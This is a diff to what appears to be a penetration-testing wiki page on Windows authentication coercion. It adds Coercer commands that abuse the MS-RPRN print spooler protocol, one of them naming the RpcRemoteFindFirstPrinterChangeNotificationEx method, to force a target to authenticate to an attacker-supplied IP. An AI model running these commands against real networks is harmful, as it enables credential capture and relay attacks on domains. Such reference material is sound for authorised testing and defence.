@@ -68,7 +68,11 @@ python dementor.py -d $DOMAIN -u $USERNAME -p $PASSWORD $ATTACKER_IP $TARGET_IP
 Yet another alternative is to use the [Coercer](https://github.com/p0dalirius/Coercer/tree/master) tool (python) as follow.
 
 ```bash
+# Coerce
 coercer coerce -u $USER -p $PASSWORD -d $DOMAIN --filter-protocol-name MS-RPRN -l $ATTACKER_IP -t $TARGET_IP
+
+# Coerce a specific method
+coercer coerce -u $USER -p $PASSWORD -d $DOMAIN --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx -l $ATTACKER_IP -t $TARGET_IP
 ```
 {% endtab %}
 
